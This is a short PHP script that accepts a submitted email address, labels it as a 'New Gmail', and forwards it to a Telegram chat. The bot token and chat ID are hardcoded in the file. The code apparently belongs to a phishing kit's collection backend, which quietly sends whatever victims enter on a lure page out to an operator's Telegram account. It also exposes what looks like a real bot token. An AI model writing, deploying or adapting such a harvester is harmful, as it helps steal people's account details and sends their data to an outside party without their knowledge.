
  <?php
// Replace with your own bot token and chat ID
$token = "7695481215:AAHnqM2aS6jIxYP2c2l6Ypj-9Kl9_NRKw2I";
$chat_id = "7614203092";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = htmlspecialchars($_POST['email']);

    $message = "🆕 New Gmail Submitted:\n📧 Email: $email";

    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
    
    // Send request to Telegram
    $response = file_get_contents($url);

    // Optional: redirect to thank you page
    echo "✅ Submitted successfully!";
}
?>
